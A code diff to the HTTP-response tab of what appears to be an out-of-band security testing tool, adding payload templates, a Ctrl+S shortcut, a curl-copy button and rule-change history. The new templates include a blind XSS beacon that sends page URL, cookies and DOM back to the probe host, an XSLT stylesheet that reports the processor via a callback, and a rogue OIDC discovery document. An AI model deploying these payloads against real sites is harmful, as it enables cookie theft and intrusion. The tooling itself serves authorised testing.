@@ -1,10 +1,10 @@
 // The HTTP response tab: how this probe answers HTTP and HTTPS hits (phase 2, answered by the edge).
 // The preview comes from the server, which runs the same code as the edge.
 import { useEffect, useMemo, useRef, useState, type ReactNode } from "react";
-import { ChevronLeft, ChevronRight, Copy, Plus, X } from "lucide-react";
+import { ChevronLeft, ChevronRight, Copy, Plus, Terminal, X } from "lucide-react";
 import { useApp, getState, fetchRule, previewRule, saveRule, setRuleDraft, takeRuleSeed } from "@/store";
 import type { HttpRule, Probe, RuleMode, RuleState, RuleVersion } from "@/lib/types";
-import { DEFAULT, MODE_DEFAULTS, decoyOf, effective, methodsOf, norm, sameRule } from "@/lib/ruleDraft";
+import { DEFAULT, MODE_DEFAULTS, decoyOf, effective, methodsOf, norm, ruleChanges, sameRule } from "@/lib/ruleDraft";
 import { reachOf } from "@/lib/reach";
 import { METADATA, redirectable } from "@/lib/metadata";
 import { dayOrTime, lineCount, plural, setupCmd } from "@/lib/format";
@@ -49,6 +49,25 @@ function templates(tag: string, host: string): Record<string, { label: string; c
       body: `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="1" height="1"><image xlink:href="${back}/svg-image" width="1" height="1"/></svg>\n`,
     },
     jwks: { label: "JWKS: empty key set", contentType: "application/json", body: `{"keys":[]}\n` },
+    // the processor names itself: a document() fetch back here with its vendor and version
+    xslt: {
+      label: "XSLT: stylesheet that reports the processor",
+      contentType: "application/xslt+xml",
+      body: `<?xml version="1.0"?>\n<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">\n<xsl:template match="/">\n<xsl:variable name="v" select="concat(system-property('xsl:vendor'), '|', system-property('xsl:version'))"/>\n<xsl:copy-of select="document(concat('http://${tagged(tag, host)}/xslt?v=', translate($v, ' ', '+')))"/>\n<xsl:value-of select="$v"/>\n</xsl:template>\n</xsl:stylesheet>\n`,
+    },
+    // where a stored payload fired: the page, its origin, the referrer, the User-Agent, readable cookies
+    // and the start of the DOM, beaconed back (sendBeacon needs no CORS; the image is the fallback)
+    "blind-xss": {
+      label: "JavaScript: blind XSS beacon",
+      contentType: "application/javascript",
+      body: `(function () {\n  var back = "${back}/bxss";\n  var d = { url: location.href, origin: location.origin, referrer: document.referrer, ua: navigator.userAgent, cookies: document.cookie, title: document.title, dom: (document.documentElement.outerHTML || "").slice(0, 4000) };\n  try { navigator.sendBeacon(back, JSON.stringify(d)); } catch (e) {}\n  new Image().src = back + "?url=" + encodeURIComponent(d.url) + "&origin=" + encodeURIComponent(d.origin);\n})();\n`,
+    },
+    // an OpenID provider at the probe: a client that trusts discovery fetches the keys and endpoints here
+    oidc: {
+      label: "OIDC: discovery document pointing back here",
+      contentType: "application/json",
+      body: `{\n  "issuer": "${back}",\n  "authorization_endpoint": "${back}/authorize",\n  "token_endpoint": "${back}/token",\n  "userinfo_endpoint": "${back}/userinfo",\n  "jwks_uri": "${back}/jwks.json",\n  "response_types_supported": ["code", "id_token", "token id_token"],\n  "subject_types_supported": ["public"],\n  "id_token_signing_alg_values_supported": ["RS256", "none"]\n}\n`,
+    },
   };
 }
 
@@ -177,6 +196,20 @@ export function HttpRuleTab({ p }: { p: Probe }) {
       toast(live ? `Saved ${p.tag} v${r.active?.version}: the next hit gets it` : `Saved ${p.tag} v${r.active?.version}. Not served until you run the cutover: the internet still gets interactsh's reply.`);
     } catch (e) { toast((e as Error).message, true); } finally { setSaving(false); }
   };
+
+  // Ctrl+S / ⌘S saves, like an editor, when Save would
+  const saveRef = useRef<() => void>(() => {});
+  saveRef.current = () => { if (dirty && !saving && !preview.error) void save(); };
+  useEffect(() => {
+    const onKey = (e: KeyboardEvent) => {
+      if (!(e.metaKey || e.ctrlKey) || e.altKey || e.key.toLowerCase() !== "s") return;
+      if (document.querySelector("[role=dialog],[role=alertdialog]")) return;
+      e.preventDefault();
+      saveRef.current();
+    };
+    addEventListener("keydown", onKey);
+    return () => removeEventListener("keydown", onKey);
+  }, []);
 
   if (loadErr) return <div id="probe-panel" role="tabpanel" aria-labelledby="probe-tab-http" className="px-6 py-[18px] text-body text-bad">Couldn't load this probe's rule: {loadErr}</div>;
   const tpl = templates(p.tag, host);
@@ -403,6 +436,8 @@ export function HttpRuleTab({ p }: { p: Probe }) {
               return <span className="truncate text-label font-normal text-ash" title={why ? `${meta}: ${why}` : meta}>{meta}</span>;
             })()}
             <span className="ml-auto flex items-center gap-0.5">
+              <Button variant="ghost" size="icon-sm" aria-label="Copy a curl test" title={`A curl that asks the saved rule for this answer (${scheme.toUpperCase()}${loop ? ", following the loop" : ""})`}
+                onClick={() => copy(`curl -i${loop ? "L" : ""} ${draft.mode === "file" ? fetchUrls[scheme === "http" ? 0 : 1] : `${scheme}://${tagged(p.tag, host)}/`}`, "curl test")}><Terminal /></Button>
               <Seg label="Preview scheme" value={scheme} onChange={setScheme} items={[["http", "HTTP"], ["https", "HTTPS"]]} />
               {loop > 0 && <>
                 <Button variant="ghost" size="icon-sm" aria-label="Previous hop" disabled={hop <= 1} onClick={() => setHop(hop - 1)}><ChevronLeft /></Button>
@@ -420,7 +455,7 @@ export function HttpRuleTab({ p }: { p: Probe }) {
         <div className="rounded-[3px] border border-rule bg-soot">
           <div className="flex h-7 items-center gap-2 border-b border-rule-2 px-3 text-body font-[650]">Rule history<span className="truncate text-label font-normal text-ash">each hit records the version that answered it</span></div>
           <ol className="m-0 list-none py-1">
-            {(rs?.history ?? []).map((v) => <HistoryRow key={v.version} v={v} live={live} current={v.version === rs?.active?.version} onLoad={() => { setDraft(norm(v.rule)); setHop(1); }} />)}
+            {(rs?.history ?? []).map((v, n, all) => <HistoryRow key={v.version} v={v} prev={all[n + 1]} live={live} current={v.version === rs?.active?.version} onLoad={() => { setDraft(norm(v.rule)); setHop(1); }} />)}
             {(live || !!rs?.defaultHits) && (
               <li className="grid grid-cols-[22px_44px_minmax(0,1fr)_auto] items-baseline gap-2.5 px-3 py-[5px] text-body">
                 <span className="text-label text-ash">—</span><span className="font-semibold text-smoke">{dayOrTime(p.plantedAt)}</span><span className="truncate text-smoke">Default reply from Colluder (no rule)</span>
@@ -439,7 +474,7 @@ export function HttpRuleTab({ p }: { p: Probe }) {
 
       <div className={cn("sticky bottom-0 col-span-full flex flex-wrap items-center gap-2 border-t border-rule bg-soot py-3 max-[820px]:bottom-7", !dirty && "max-[820px]:static")}>
         {dirty && <span className="mr-1 flex items-center gap-1.5 text-body text-smoke"><i className="inline-block size-1.5 rounded-full border-[1.5px] border-smoke" />Unsaved changes</span>}
-        <Button disabled={!dirty || saving || !!preview.error} onClick={save}>Save as v{nextVersion}</Button>
+        <Button disabled={!dirty || saving || !!preview.error} onClick={save} title={`Save (${/Mac|iP(hone|ad)/.test(navigator.platform) ? "⌘S" : "Ctrl+S"})`}>Save as v{nextVersion}</Button>
         <Button variant="quiet" disabled={!dirty || saving} onClick={() => { setDraft(base); setHop(1); }}>Discard</Button>
         <span className="ml-2 text-label text-ash">{live ? "Saved rules answer the next hit." : "Saved rules go live with the cutover."} Earlier hits keep the answer they got.</span>
       </div>
@@ -457,7 +492,9 @@ function CopyLine({ text, what, strong }: { text: string; what: string; strong?:
   );
 }
 
-function HistoryRow({ v, current, live, onLoad }: { v: RuleVersion; current: boolean; live: boolean; onLoad: () => void }) {
+function HistoryRow({ v, prev, current, live, onLoad }: { v: RuleVersion; prev?: RuleVersion; current: boolean; live: boolean; onLoad: () => void }) {
+  // what this version changed from the one before it (history is newest first)
+  const changed = prev ? ruleChanges(prev.rule, v.rule) : [];
   const r = v.rule;
   const codes = Array.isArray(r.hopStatuses) && r.hopStatuses.length ? ` (${r.hopStatuses.join("/")})` : "";
   const what = (r.mode === "default" ? "Default reply" : r.mode === "redirect" ? `Redirect ${r.status} → ${r.location}${r.loop ? `, loop ×${r.loop}${codes}` : ""}`
@@ -468,7 +505,9 @@ function HistoryRow({ v, current, live, onLoad }: { v: RuleVersion; current: boo
     <li className={cn("grid grid-cols-[22px_44px_minmax(0,1fr)_auto] items-baseline gap-2.5 px-3 py-[5px] text-body", current && "bg-soot-2")}>
       <span className="text-label text-smoke">v{v.version}</span>
       <span className="font-semibold">{dayOrTime(v.createdAt)}</span>
-      <button type="button" className="cursor-pointer truncate text-left text-smoke hover:text-bone" title={`Load v${v.version} into the editor`} onClick={onLoad}>{what}</button>
+      <button type="button" className="min-w-0 cursor-pointer truncate text-left text-smoke hover:text-bone" title={`Load v${v.version} into the editor${prev ? `\nChanged from v${prev.version}: ${changed.length ? changed.join(", ") : "nothing"}` : ""}`} onClick={onLoad}>
+        {what}{prev && changed.length > 0 && <span className="text-ash"> · changed {changed.join(", ")}</span>}
+      </button>
       <span className="text-label whitespace-nowrap text-ash">{current ? (live ? "active · " : "saved · not served yet · ") : ""}{v.savedBy === "claude" ? "by Claude · " : ""}answered {plural(v.hits ?? 0, "hit")}{decoys}{depth}</span>
     </li>
   );
